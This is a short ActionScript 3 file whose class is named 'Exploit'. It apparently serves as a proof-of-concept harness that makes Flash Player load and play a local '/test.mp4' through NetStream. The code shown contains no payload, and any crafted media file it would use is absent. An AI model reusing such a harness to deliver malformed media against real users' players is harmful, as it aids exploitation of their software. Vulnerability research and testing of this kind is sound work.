package {
	import flash.display.*;
	import flash.text.*;
	import flash.display.*;
	import flash.media.*;
	import flash.net.*;
	import flash.utils.*;
		
	public class Exploit extends Sprite {
		private var greeting:TextField = new TextField();
		public var MyVideo:Video;
		public var MyNC:NetConnection;
		public var MyNS:NetStream;
	
		public function Exploit() {	  
				greeting.text = "Loading...";
				greeting.x = 100;
				greeting.y = 100;
				addChild(greeting);

				MyVideo = new Video();
				addChild(MyVideo);
				MyNC = new NetConnection();
				MyNC.connect(null);
				MyNS = new NetStream(MyNC);
				MyVideo.attachNetStream(MyNS);
				MyNS.play("/test.mp4");	
		 
		}
	}
}
